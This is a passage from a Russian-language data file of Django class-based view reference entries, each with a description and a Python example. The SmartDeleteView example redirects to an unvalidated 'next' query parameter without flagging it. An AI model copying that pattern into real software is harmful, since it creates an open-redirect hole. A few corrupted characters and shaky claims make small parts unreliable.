    success_url = '/articles/%(slug)s/'`,
  },
  {
    name: "FormView.form_valid(form)",
    category: "Built-in class-based views API",
    description:
      "Метод-хук, вызываемый, когда форма прошла валидацию (form.is_valid() == True). Стандартная реализация делает HTTP-редирект на get_success_url(). Переопределяется для выполнения побочных действий: сохранение в БД, отправка email, постановка задачи в очередь. Обязательно вернуть HttpResponse — обычно через super().form_valid(form), чтобы получить стандартный редирект.",
    syntax: "FormView.form_valid(form)",
    arguments: [
      {
        name: "form",
        description:
          "Экземпляр формы (form_class) с заполненным form.cleaned_data. Метод вызывается уже после успешной валидации.",
      },
    ],
    example: `from django.urls import reverse_lazy
from django.contrib import messages
from django.core.mail import send_mail
from django.views.generic.edit import FormView
from .forms import ContactForm
from .tasks import send_notification_async

class ContactView(FormView):
    template_name = 'contact/form.html'
    form_class = ContactForm
    success_url = reverse_lazy('contact-thanks')

    def form_valid(self, form):
        data = form.cleaned_data

        # 1. Записать обращение в БД
        ticket = Ticket.objects.create(
            email=data['email'],
            subject=data['subject'],
            body=data['message'],
        )

        # 2. Отправить уведомление модераторам (синхронно)
        send_mail(
            subject=f'Новое обращение #{ticket.id}',
            message=data['message'],
            from_email=data['email'],
            recipient_list=['support@example.com'],
        )

        # 3. Поставить асинхронную задачу
        send_notification_async.delay(ticket.id)

        # 4. Сообщение пользователю
        messages.success(self.request, 'Сообщение отправлено!')

        # Обязательно вернуть HttpResponse (super() сделает редирект на success_url)
        return super().form_valid(form)

    def form_invalid(self, form):
        messages.error(self.request, 'Проверьте поля формы')
        return super().form_invalid(form)`,
  },
  {
    name: "CreateView.template_name_suffix",
    category: "Built-in class-based views API",
    description:
      'Суффикс, добавляемый к имени модели для построения имени шаблона по умолчанию, если template_name не задан. У CreateView равен "_form" — итоговый шаблон ищется как <app_label>/<model_name>_form.html (имя модели в нижнем регистре). Например, для модели Article в приложении blog: blog/article_form.html. Тот же суффикс используется в UpdateView, поэтому create- и update-формы по умолчанию делят один шаблон.',
    syntax: 'CreateView.template_name_suffix = "_form"',
    arguments: [],
    example: `from django.views.generic.edit import CreateView
from .models import Article

# Стандартное поведение: ищется blog/article_form.html
class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'body']
    # template_name не задан → имя строится автоматически:
    # <app_label>/<model_name><template_name_suffix>.html
    # → blog/article_form.html

# Разделить шаблоны create и update
class ArticleCreate2(CreateView):
    model = Article
    fields = ['title', 'body']
    template_name_suffix = '_create_form'
    # → blog/article_create_form.html

# Полностью переопределить через template_name (имеет приоритет над суффиксом)
class ArticleCreate3(CreateView):
    model = Article
    fields = ['title', 'body']
    template_name = 'forms/article_new.html'

# Шаблонная иерархия поиска для CreateView (если ничего не задано):
#   1. <app_label>/<model_name>_form.html
#   2. (если model унаследована) — для базовых классов`,
  },
  {
    name: "CreateView.object",
    category: "Built-in class-based views API",
    description:
      "Атрибут экземпляра CreateView, ссылающийся на создаваемый объект модели. На GET-запросе равен None (объекта ещё нет). После успешной валидации формы и сохранения внутри form_valid() заполняется только что созданным экземпляром модели и используется для построения success_url, get_absolute_url() и передачи в контекст шаблона. Доступен в form_valid()/form_invalid()/get_context_data() через self.object.",
    syntax: "self.object  # экземпляр модели или None",
    arguments: [],
    example: `from django.views.generic.edit import CreateView
from django.http import JsonResponse
from .models import Article

class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'body', 'category']
    success_url = '/articles/'

    def form_valid(self, form):
        # До super() self.object ещё None
        assert self.object is None

        # ModelFormMixin.form_valid() сохранит объект и установит self.object
        response = super().form_valid(form)

        # После super() self.object — это новый Article
        print(f'Создана статья #{self.object.pk}: {self.object.title}')
        return response

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        # На GET — None, на POST с ошибкой формы — None
        ctx['is_creating'] = self.object is None
        return ctx

# JSON-вариант — вернуть свежесозданный объект
class ArticleCreateAPI(CreateView):
    model = Article
    fields = ['title', 'body']
    http_method_names = ['post']

    def form_valid(self, form):
        self.object = form.save()
        return JsonResponse(
            {'id': self.object.pk, 'title': self.object.title},
            status=201,
        )`,
  },
  {
    name: "CreateView.model",
    category: "Built-in class-based views API",
    description:
      "Класс модели Django, для которой создаётся новый объект. На основе model автоматически строится ModelForm (если не задан form_class) и определяется имя шаблона по умолчанию (<app>/<model>_form.html). При указании model обязательно задать также fields (или form_class) — иначе будет ImproperlyConfigured. Альтернатива — переопределить get_queryset() для динамического выбора модели.",
    syntax: "CreateView.model = MyModel",
    arguments: [],
    example: `from django.views.generic.edit import CreateView
from .models import Article, Comment

class ArticleCreate(CreateView):
    model = Article            # из этого выводятся:
    fields = ['title', 'body'] #   - ModelForm для Article
                               #   - имя шаблона: <app>/article_form.html

# Альтернатива: form_class задаёт модель неявно через ModelForm.Meta
from django import forms

class CommentForm(forms.ModelForm):
    class Meta:
        model = Comment
        fields = ['post', 'text']

class CommentCreate(CreateView):
    form_class = CommentForm   # model и fields брать не нужно — они в Meta
    template_name = 'comments/new.html'
    success_url = '/comments/'

# Если задано и model, и form_class — form_class имеет приоритет, model
# используется только для имени шаблона по умолчанию.

# Ошибка: model задан, fields/form_class — нет
class BrokenView(CreateView):
    model = Article
    # ImproperlyConfigured: Using ModelFormMixin (base class of BrokenView)
    # without the 'fields' attribute is prohibited.`,
  },
  {
    name: "CreateView.fields",
    category: "Built-in class-based views API",
    description:
      'Список имён полей модели, которые должны быть включены в автоматически генерируемую ModelForm. Используется только если form_class не задан. Поля выводятся в форму в указанном порядке. Альтернативные значения: список строк ["title", "body"], или "__all__" для включения всех полей модели (не рекомендуется в production — небезопасно для случайно добавленных полей). Не задавать одновременно с form_class — будет ImproperlyConfigured.',
    syntax: 'CreateView.fields = ["title", "body"]',
    arguments: [],
    example: `from django.views.generic.edit import CreateView
from .models import Article

# Явный список полей — рекомендуемый способ
class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'slug', 'body', 'category']
    # Порядок в списке = порядок отображения в форме

# Все поля модели (опасно — попадут случайно добавленные поля)
class ArticleCreateAll(CreateView):
    model = Article
    fields = '__all__'   # включит все редактируемые поля Article

# Если нужны кастомизации (виджеты, валидаторы, методы) — используйте form_class
from django import forms
class ArticleForm(forms.ModelForm):
    body = forms.CharField(widget=forms.Textarea(attrs={'rows': 20}))
    class Meta:
        model = Article
        fields = ['title', 'slug', 'body']

class ArticleCreate2(CreateView):
    form_class = ArticleForm   # не задавайте fields параллельно

# Нельзя задавать одновременно — ImproperlyConfigured:
class BrokenView(CreateView):
    model = Article
    fields = ['title']
    form_class = ArticleForm
    # Specifying both 'fields' and 'form_class' is not permitted.`,
  },
  {
    name: "UpdateView.template_name_suffix",
    category: "Built-in class-based views API",
    description:
      'Суффикс, добавляемый к имени модели для построения имени шаблона по умолчанию, если template_name не задан. У UpdateView равен "_form" — итоговый шаблон ищется как <app_label>/<model_name>_form.html. Совпадает с суффиксом CreateView, поэтому по умолчанию обе формы (создание и редактирование) используют один и тот же шаблон. Чтобы развести их, переопределите template_name_suffix или template_name.',
    syntax: 'UpdateView.template_name_suffix = "_form"',
    arguments: [],
    example: `from django.views.generic.edit import UpdateView
from .models import Article

# Стандартное поведение: тот же шаблон, что и у CreateView
class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']
    # → blog/article_form.html (общий с ArticleCreate)

# Разделить шаблоны create и update
class ArticleUpdate2(UpdateView):
    model = Article
    fields = ['title', 'body']
    template_name_suffix = '_update_form'
    # → blog/article_update_form.html

# Шаблон может проверять, является ли это создание или редактирование:
# templates/blog/article_form.html
# {% if object %}
#   <h1>Редактирование «{{ object.title }}»</h1>
# {% else %}
#   <h1>Новая статья</h1>
# {% endif %}
# <form method="post">{% csrf_token %}{{ form.as_p }}<button>Сохранить</button></form>

# Полное переопределение имени шаблона
class ArticleUpdate3(UpdateView):
    model = Article
    fields = ['title', 'body']
    template_name = 'forms/article_edit.html'`,
  },
  {
    name: "UpdateView.object",
    category: "Built-in class-based views API",
    description:
      "Атрибут экземпляра UpdateView, ссылающийся на редактируемый объект модели. Загружается из БД методом get_object() (на основе pk/slug из URL) ещё до вызова get/post — на любой стадии обработки запроса self.object содержит текущий объект. Используется при построении формы (instance=self.object), вычислении success_url через get_absolute_url(), а также доступен в шаблоне через переменную object и <model_name>.",
    syntax: "self.object  # текущий редактируемый экземпляр модели",
    arguments: [],
    example: `from django.views.generic.edit import UpdateView
from django.http import HttpResponseForbidden
from .models import Article

class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']

    def dispatch(self, request, *args, **kwargs):
        # self.object ещё не установлен в dispatch — вызовите get_object() явно
        article = self.get_object()
        if article.author != request.user:
            return HttpResponseForbidden('Чужая статья')
        return super().dispatch(request, *args, **kwargs)

    def form_valid(self, form):
        # self.object уже загружен из БД (старая версия объекта)
        original_title = self.object.title

        # super() сохранит изменения и обновит self.object
        response = super().form_valid(form)

        if original_title != self.object.title:
            log_title_change(self.object, original_title)

        return response

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        # В шаблоне доступно как {{ object }} и как {{ article }} (=context_object_name)
        ctx['is_published'] = self.object.status == 'published'
        return ctx`,
  },
  {
    name: "UpdateView.model",
    category: "Built-in class-based views API",
    description:
      "Класс модели Django, экземпляр которой редактируется. Используется для: автоматической генерации ModelForm (если form_class не задан), определения queryset по умолчанию (Model.objects.all()) при загрузке объекта и построения имени шаблона <app>/<model>_form.html. Альтернатива — задать queryset для ограниЇения видимых объектов или get_object() для произвольной логики загрузки.",
    syntax: "UpdateView.model = MyModel",
    arguments: [],
    example: `from django.views.generic.edit import UpdateView
from .models import Article

# Простейший случай — model + fields
class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']
    # urls.py: path('articles/<int:pk>/edit/', ArticleUpdate.as_view())

# Ограничение видимых объектов через queryset (а не model)
class MyArticleUpdate(UpdateView):
    fields = ['title', 'body']

    def get_queryset(self):
        # Пользователь редактирует только свои статьи
        return Article.objects.filter(author=self.request.user)
    # 404, если статья принадлежит другому автору

# Альтернатива: form_class задаёт модель через ModelForm.Meta
from django import forms
class ArticleForm(forms.ModelForm):
    class Meta:
        model = Article
        fields = ['title', 'body']

class ArticleUpdate2(UpdateView):
    model = Article          # нужен для шаблона <app>/article_form.html
    form_class = ArticleForm # переопределяет автогенерируемую форму

# Поиск по slug вместо pk (нужно поле slug_url_kwarg)
class ArticleUpdateBySlug(UpdateView):
    model = Article
    fields = ['title', 'body']
    slug_url_kwarg = 'slug'   # параметр URL
    slug_field = 'slug'       # поле модели
    # urls.py: path('articles/<slug:slug>/edit/', ArticleUpdateBySlug.as_view())`,
  },
  {
    name: "UpdateView.fields",
    category: "Built-in class-based views API",
    description:
      'Список имён полей модели, доступных для редактирования через автоматически генерируемую ModelForm. Поля, не вошедшие в этот список, останутся со значениями, загруженными из БД, и не будут изменены даже если пользователь подменит их в HTTP-запросе. Используется только при отсутствии form_class. Допустимы значения: список строк или "__all__" (все редактируемые поля). Одновременное задание fields и form_class запрещено.',
    syntax: 'UpdateView.fields = ["title", "body"]',
    arguments: [],
    example: `from django.views.generic.edit import UpdateView
from .models import Article

# Разрешаем редактировать только title и body, остальные поля защищены
class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']
    # Поля author, created_at, status и т.п. нельзя изменить через эту форму,
    # даже если их значения подменить в POST.

# Разные права — разные наборы полей
class ArticleUpdateForAuthor(UpdateView):
    model = Article
    fields = ['title', 'body']

class ArticleUpdateForEditor(UpdateView):
    model = Article
    fields = ['title', 'body', 'status', 'category', 'featured']

# Динамический выбор полей в зависимости от пользователя
class SmartArticleUpdate(UpdateView):
    model = Article

    def get_form_class(self):
        from django.forms import modelform_factory
        if self.request.user.is_staff:
            fields = ['title', 'body', 'status', 'featured']
        else:
            fields = ['title', 'body']
        return modelform_factory(Article, fields=fields)

# Использование form_class — fields задавать нельзя (ImproperlyConfigured)
from django import forms
class ArticleForm(forms.ModelForm):
    class Meta:
        model = Article
        fields = ['title', 'body']

class ArticleUpdate2(UpdateView):
    form_class = ArticleForm
    # fields = [...] здесь приведёт к ошибке`,
  },
  {
    name: "DeleteView.form_class",
    category: "Built-in class-based views API",
    description:
      "Класс формы подтверждения удаления (наследник django.forms.Form). Начиная с Django 4.0 DeleteView обрабатывает POST-запрос как отправку формы (раньше — как простой триггер удаления). По умолчанию используется django.views.generic.edit.Form (пустая форма, нужная только для CSRF-защиты). form_class задают для добавления собственных полей подтверждения: чекбокс «я уверен», ввод названия объекта, причина удаления и т. п.",
    syntax: "DeleteView.form_class = MyConfirmForm",
    arguments: [],
    example: `# forms.py
from django import forms

class ConfirmDeleteForm(forms.Form):
    confirm_text = forms.CharField(
        label='Введите название объекта для подтверждения',
        max_length=200,
    )
    reason = forms.CharField(
        label='Причина удаления',
        widget=forms.Textarea,
        required=False,
    )

# views.py
from django.urls import reverse_lazy
from django.views.generic.edit import DeleteView
from .forms import ConfirmDeleteForm
from .models import Article

class ArticleDelete(DeleteView):
    model = Article
    form_class = ConfirmDeleteForm
    success_url = reverse_lazy('article-list')

    def form_valid(self, form):
        # Проверяем кастомное поле перед удалением
        if form.cleaned_data['confirm_text'] != self.object.title:
            form.add_error('confirm_text', 'Текст не совпадает с названием статьи')
            return self.form_invalid(form)

        # Логируем причину
        DeletionLog.objects.create(
            object_repr=str(self.object),
            user=self.request.user,
            reason=form.cleaned_data.get('reason', ''),
        )
        return super().form_valid(form)   # удалит объект и редиректит на success_url

# templates/<app>/article_confirm_delete.html
# <form method="post">{% csrf_token %}
#   <p>Удалить «{{ object.title }}»?</p>
#   {{ form.as_p }}
#   <button>Удалить</button>
# </form>`,
  },
  {
    name: "DeleteView.template_name_suffix",
    category: "Built-in class-based views API",
    description:
      'Суффикс, добавляемый к имени модели для построения имени шаблона подтверждения удаления, если template_name не задан. У DeleteView равен "_confirm_delete" — итоговый шаблон ищется как <app_label>/<model_name>_confirm_delete.html. Например, для модели Article в приложении blog: blog/article_confirm_delete.html. Шаблон рендерится только на GET (показ страницы подтверждения); POST выполняет само удаление и редиректит на success_url.',
    syntax: 'DeleteView.template_name_suffix = "_confirm_delete"',
    arguments: [],
    example: `from django.views.generic.edit import DeleteView
from .models import Article

# Стандартное поведение: ищется blog/article_confirm_delete.html
class ArticleDelete(DeleteView):
    model = Article
    success_url = '/articles/'
    # template_name не задан → имя строится автоматически:
    # <app_label>/<model_name><template_name_suffix>.html
    # → blog/article_confirm_delete.html

# Кастомный суффикс T�ля разных типов удаления (мягкое vs жёсткое)
class ArticleHardDelete(DeleteView):
    model = Article
    template_name_suffix = '_hard_delete'
    # → blog/article_hard_delete.html

# Полное переопределение через template_name (имеет приоритет над суффиксом)
class ArticleDelete2(DeleteView):
    model = Article
    template_name = 'forms/article_remove.html'
    success_url = '/articles/'

# templates/blog/article_confirm_delete.html
# <h1>Удалить «{{ object.title }}»?</h1>
# <p>Это действие нельзя отменить.</p>
# <form method="post">
#   {% csrf_token %}
#   <button>Да, удалить</button>
#   <a href="{{ object.get_absolute_url }}">Отмена</a>
# </form>`,
  },
  {
    name: "DeleteView.model",
    category: "Built-in class-based views API",
    description:
      "Класс модели Django, экземпляр которой удаляется. Используется для: загрузки объекта по pk/slug из URL (через get_object()), определения queryset по умолчанию (Model.objects.all()) и построения имени шаблона <app>/<model>_confirm_delete.html. Альтернатива — задать queryset (для ограничения видимых объектов) или переопределить get_object() для произвольной логики загрузки.",
    syntax: "DeleteView.model = MyModel",
    arguments: [],
    example: `from django.urls import reverse_lazy
from django.views.generic.edit import DeleteView
from .models import Article

# Простейший случай — просто model
class ArticleDelete(DeleteView):
    model = Article
    success_url = reverse_lazy('article-list')
    # urls.py: path('articles/<int:pk>/delete/', ArticleDelete.as_view())

# Ограничение видимых объектов через queryset (а не model)
class MyArticleDelete(DeleteView):
    success_url = reverse_lazy('article-list')

    def get_queryset(self):
        # Пользователь удаляет только свои статьи
        return Article.objects.filter(author=self.request.user)
    # 404, если статья принадлежит другому автору

# Поиск по slug вместо pk
class ArticleDeleteBySlug(DeleteView):
    model = Article
    success_url = reverse_lazy('article-list')
    slug_url_kwarg = 'slug'   # имя параметра в URL
    slug_field = 'slug'       # имя поля в модели
    # urls.py: path('articles/<slug:slug>/delete/', ArticleDeleteBySlug.as_view())

# Мягкое удаление вместо настоящего: переопределить form_valid()
class SoftDeleteView(DeleteView):
    model = Article
    success_url = reverse_lazy('article-list')

    def form_valid(self, form):
        self.object = self.get_object()
        self.object.is_deleted = True
        self.object.deleted_at = timezone.now()
        self.object.save(update_fields=['is_deleted', 'deleted_at'])
        return HttpResponseRedirect(self.get_success_url())`,
  },
  {
    name: "DeleteView.success_url",
    category: "Built-in class-based views API",
    description:
      'URL, на который выполняется HTTP-редирект после успешного удаления объекта. Атрибут обязателен — без него и без переопределения get_success_url() будет ImproperlyConfigured. Поддерживает %-подстановки из self.object.__dict__, но они вычисляются ДО удаления — после удаления атрибуты объекта (например, pk) ещё доступны. Лучшая практика — задавать через reverse_lazy("name"), чтобы избежать циклических импортов в URLconf.',
    syntax: 'DeleteView.success_url = reverse_lazy("name")',
    arguments: [],
    example: `from django.urls import reverse_lazy
from django.views.generic.edit import DeleteView
from .models import Article, Category

# Стандартный способ — reverse_lazy на список объектов
class ArticleDelete(DeleteView):
    model = Article
    success_url = reverse_lazy('article-list')

# %-подстановка из атрибутов удалённого объекта (доступны до redelete)
class ArticleDeleteToCategory(DeleteView):
    model = Article
    # category_id ещё доступен после удаления статьи
    success_url = '/categories/%(category_id)d/'

# Динамический success_url — переопределить get_success_url()
class CommentDelete(DeleteView):
    model = Comment

    def get_success_url(self):
        # Возвращаемся к посту, под которым был комментарий
        return reverse_lazy(
            'post-detail',
            kwargs={'slug': self.object.post.slug},
        )

# Возврат на referrer (страницу, с которой пришёл пользователь)
class SmartDeleteView(DeleteView):
    model = Article

    def get_success_url(self):
        return self.request.GET.get('next', reverse_lazy('article-list'))

# Без success_url и без get_success_url() — ImproperlyConfigured:
class BrokenDelete(DeleteView):
    model = Article
    # No URL to redirect to. Provide a success_url.`,
  },
  {
    name: "BaseCreateView.get(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик GET-запроса в BaseCreateView. Сбрасывает self.object в None (объекта ещё нет — его только создают), затем делегирует обработку родительскому ProcessFormView.get(): создаёт незаполненную форму через get_form() и передаёт её в шаблон через render_to_response(). Переопределяется редко — обычно достаточно настроить fields, form_class и шаблон.",
    syntax: "BaseCreateView.get(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest текущего GET-запроса.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.views.generic.edit import CreateView, BaseCreateView
from django.http import JsonResponse
from .models import Article

# Стандартное использование — переопределять get() обычно не нужно
class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'body']
    template_name = 'articles/article_form.html'
    # GET → пустая форма; POST → валидация и сохранение

# Переопределение get(): запретить отображение формы определённым пользователям
class GatedArticleCreate(CreateView):
    model = Article
    fields = ['title', 'body']
    template_name = 'articles/article_form.html'

    def get(self, request, *args, **kwargs):
        if not request.user.has_perm('articles.add_article'):
            return HttpResponseForbidden('Нет прав на создание статьи')
        # Стандартное поведение: self.object = None и рендеринг формы
        return super().get(request, *args, **kwargs)

# JSON-эндпоинт: вернуть схему формы вместо HTML
class ArticleCreateAPI(BaseCreateView):
    model = Article
    fields = ['title', 'body']
    http_method_names = ['get', 'post']

    def get(self, request, *args, **kwargs):
        self.object = None
        form = self.get_form()
        # Описание ожидаемых полей
        return JsonResponse({
            'fields': {
                name: {
                    'label': str(field.label),
                    'required': field.required,
                    'type': field.widget.__class__.__name__,
                }
                for name, field in form.fields.items()
            },
        })`,
  },
  {
    name: "BaseCreateView.post(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик POST-запроса в BaseCreateView. Сбрасывает self.object в None, затем делегирует обработку родительскому ProcessFormView.post(): создаёт форму с данными из request.POST/FILES, вызывает form.is_valid() и направляет результат в form_valid() (с сохранением self.object = form.save()) либо в form_invalid(). Переопределяется для предобработки данных или нестандартной логики обработки POST.",
    syntax: "BaseCreateView.post(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description:
          "Объект HttpRequest с методом POST. request.POST содержит данные формы, request.FILES — загруженные файлы.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.views.generic.edit import CreateView, BaseCreateView
from django.http import JsonResponse, HttpResponseForbidden
from django.views.decorators.debug import sensitive_post_parameters
from django.utils.decorators import method_decorator
from .models import Article, Subscriber

# Стандартное использование — переопределять post() обычно не нужно,
# вместо этого используйте form_valid()/form_invalid()
class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'body']
    success_url = '/articles/'

    def form_valid(self, form):
        form.instance.author = self.request.user
        return super().form_valid(form)

# Переопределение post() — централизованная защита от ботов
class SubscribeView(CreateView):
    model = Subscriber
    fields = ['email']
    success_url = '/'

    def post(self, request, *args, **kwargs):
        # Honeypot-поле проверяется до form.is_valid()
        if request.POST.get('website'):   # боты заполняют скрытое поле
            return HttpResponseForbidden('Bot detected')
        return super().post(request, *args, **kwargs)

# JSON-API: принять JSON-тело и сохранить
import json
class ArticleCreateAPI(BaseCreateView):
    model = Article
    fields = ['title', 'body']
    http_method_names = ['post']

    def post(self, request, *args, **kwargs):
        # Собираем POST-данные из JSON-тела
        try:
            data = json.loads(request.body)
        except json.JSONDecodeError:
            return JsonResponse({'error': 'Invalid JSON'}, status=400)

        # Подменяем request.POST для стандартной логики формы
        request.POST = data
        return super().post(request, *args, **kwargs)

    def form_valid(self, form):
        self.object = form.save()
        return JsonResponse({'id': self.object.pk}, status=201)

    def form_invalid(self, form):
        return JsonResponse({'errors': form.errors}, status=400)`,
  },
  {
    name: "BaseUpdateView.get(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик GET-запроса в BaseUpdateView. Загружает редактируемый объект через self.object = self.get_object(), затем делегирует обработку родительскому ProcessFormView.get(): создаёт форму с instance=self.object (поля заполнены текущими значениями) и передаёт её в шаблон. Если объект не найден — get_object() выбрасывает Http404.",
    syntax: "BaseUpdateView.get(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest текущего GET-запроса.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description:
          "Именованные аргументы из URL-резолвера (обычно содержат pk или slug объекта).",
      },
    ],
    example: `from django.views.generic.edit import UpdateView, BaseUpdateView
from django.http import JsonResponse, HttpResponseRedirect
from django.urls import reverse
from .models import Article

# Стандартное использование — get() переопределять обычно не нужно
class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']
    template_name = 'articles/article_form.html'

# Переопределение get(): редирект, если объект уже опубликован
class DraftEditView(UpdateView):
    model = Article
    fields = ['title', 'body']
    template_name = 'articles/article_form.html'

    def get(self, request, *args, **kwargs):
        # super() сначала загрузит self.object через get_object(), но мы можем
        # выполнить проверку до показа формы:
        self.object = self.get_object()
        if self.object.status == 'published':
            return HttpResponseRedirect(
                reverse('article-detail', kwargs={'pk': self.object.pk})
            )
        # Стандартный путь — рендеринг формы
        return super().get(request, *args, **kwargs)

# JSON-эндпоинт: вернуть текущие значения вместо HTML-формы
class ArticleEditAPI(BaseUpdateView):
    model = Article
    fields = ['title', 'body']
    http_method_names = ['get', 'put', 'patch']

    def get(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        return JsonResponse({
            'id': self.object.pk,
            'values': {name: form[name].value() for name in form.fields},
        })`,
  },
  {
    name: "BaseUpdateView.post(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Обработчик POST-запроса в BaseUpdateView. Загружает редактируемый объект через self.object = self.get_object(), затем делегирует обработку родительскому ProcessFormView.post(): создаёт форму с instance=self.object и данными из request.POST/FILES, вызывает form.is_valid() и направляет в form_valid() (с сохранением через form.save()) либо form_invalid(). Тот же обработчик используется и для PUT/PATCH (через as_view() и http_method_names).",
    syntax: "BaseUpdateView.post(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description:
          "Объект HttpRequest с методом POST. request.POST содержит изменённые поля формы, request.FILES — загруженные файлы.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description:
          "Именованные аргументы из URL-резолвера (обычно pk или slug редактируемого объекта).",
      },
    ],
    example: `from django.views.generic.edit import UpdateView, BaseUpdateView
from django.http import JsonResponse, HttpResponseForbidden
from .models import Article

# Стандартное использование — обычно переопределяют form_valid(), а не post()
class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']
    success_url = '/articles/'

    def form_valid(self, form):
        form.instance.updated_by = self.request.user
        return super().form_valid(form)

# Переопределение post() — оптимистичная блокировка по версии
class VersionedArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body', 'version']

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        # Сравниваем версию из формы с актуальной в БД
        client_version = int(request.POST.get('version', 0))
        if client_version != self.object.version:
            return HttpResponseForbidden(
                'Объект был изменён другим пользователем. Перезагрузите страницу.'
            )
        return super().post(request, *args, **kwargs)

# JSON PATCH-эндпоинт: частичное обновление через JSON-тело
import json
class ArticlePatchAPI(BaseUpdateView):
    model = Article
    fields = ['title', 'body']
    http_method_names = ['patch']

    def patch(self, request, *args, **kwargs):
        # PATCH использует тот же код, что и post()
        return self.post(request, *args, **kwargs)

    def post(self, request, *args, **kwargs):
        try:
            data = json.loads(request.body)
        except json.JSONDecodeError:
            return JsonResponse({'error': 'Invalid JSON'}, status=400)

        # Подмешиваем JSON-данные поверх текущих значений объекта
        self.object = self.get_object()
        merged = {f: getattr(self.object, f) for f in self.fields}
        merged.update(data)
        request.POST = merged
        return super().post(request, *args, **kwargs)

    def form_valid(self, form):
        self.object = form.save()
        return JsonResponse({'id': self.object.pk}, status=200)

    def form_invalid(self, form):
        return JsonResponse({'errors': form.errors}, status=400)`,
  },
  {
    name: "DetailView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.detail.DetailView — отображает страницу с одним объектом модели. Загружает объект из БД по pk или slug, переданному в URL, передаёт его в шаблон под именем object и под именем модели в нижнем регистре (например, article). Шаблон по умолчанию — <app_label>/<model_name>_detail.html. Состоит из BaseDetailView + SingleObjectTemplateResponseMixin.",
    syntax: `from django.views.generic.detail import DetailView

class ArticleDetail(DetailView):
    model = Article`,
    arguments: [],
    example: `# views.py
from django.views.generic.detail import DetailView
from .models import Article

class ArticleDetail(DetailView):
    model = Article
    # template_name по умолчанию: <app>/article_detail.html
    # context_object_name по умолчанию: 'article' (имя модели в нижнем регистре)

# urls.py
from django.urls import path
from .views import ArticleDetail

urlpatterns = [
    # /articles/42/  →  Article.objects.get(pk=42)
    path('articles/<int:pk>/', ArticleDetail.as_view(), name='article-detail'),
    # /articles/my-slug/  →  поиск по slug
    path(
        'articles/<slug:slug>/',
        ArticleDetail.as_view(slug_field='slug', slug_url_kwarg='slug'),
    ),
]

# templates/<app>/article_detail.html
# <h1>{{ article.title }}</h1>
# <p>{{ article.body }}</p>
# <p>Автор: {{ article.author }}</p>
# Эквивалентно: {{ object.title }}, {{ object.body }}, {{ object.author }}`,
  },
  {
    name: "BaseDetailView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.detail.BaseDetailView — реализует логику загрузки одного объекта по pk/slug и передачу его в контекст без миксина рендеринга шаблона (SingleObjectTemplateResponseMixin). Прямой родитель DetailView (= BaseDetailView + SingleObjectTemplateResponseMixin). Используется для возврата JSON, файлов или других нестандартных ответов на основе одного объекта.",
    syntax: `from django.views.generic.detail import BaseDetailView

class ApiDetailView(BaseDetailView):
    model = Article
    def render_to_response(self, context, **kw):
        ...`,
    arguments: [],
    example: `from django.http import JsonResponse, FileResponse
from django.views.generic.detail import BaseDetailView
from .models import Article, Document

# JSON-эндпоинт детали объекта
class ArticleDetailAPI(BaseDetailView):
    model = Article

    def render_to_response(self, context, **response_kwargs):
        article = context['object']
        return JsonResponse({
            'id':     article.pk,
            'title':  article.title,
            'body':   article.body,
            'author': article.author.username,
        })

# Отдача файла на основе объекта Document
class DocumentDownloadView(BaseDetailView):
    model = Document

    def render_to_response(self, context, **response_kwargs):
        doc = context['object']
        return FileResponse(
            doc.file.open('rb'),
            as_attachment=True,
            filename=doc.original_name,
        )

# DetailView      = BaseDetailView + SingleObjectTemplateResponseMixin
# BaseDetailView  = SingleObjectMixin + View   (без рендеринга шаблона)`,
  },
  {
    name: "ListView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.list.ListView — отображает список объектов модели с поддержкой пагинации. Загружает объекты через self.get_queryset() (по умолчанию Model.objects.all()) и передаёт в шаблон как object_list и под именем <model>_list. Шаблон по умолчанию — <app_label>/<model_name>_list.html. Состоит из BaseListView + MultipleObjectTemplateResponseMixin.",
    syntax: `from django.views.generic.list import ListView

class ArticleList(ListView):
    model = Article
    paginate_by = 20`,
    arguments: [],
    example: `# views.py
from django.views.generic.list import ListView
from .models import Article

class ArticleList(ListView):
    model = Article
    paginate_by = 20
    ordering = ['-created_at']
    # template_name по умолчанию: <app>/article_list.html
    # context_object_name по умолчанию: 'article_list' и 'object_list'

# Кастомный queryset (поиск, фильтрация)
class PublishedArticleList(ListView):
    model = Article
    paginate_by = 10
    template_name = 'articles/published.html'
    context_object_name = 'articles'   # явное имя для шаблона

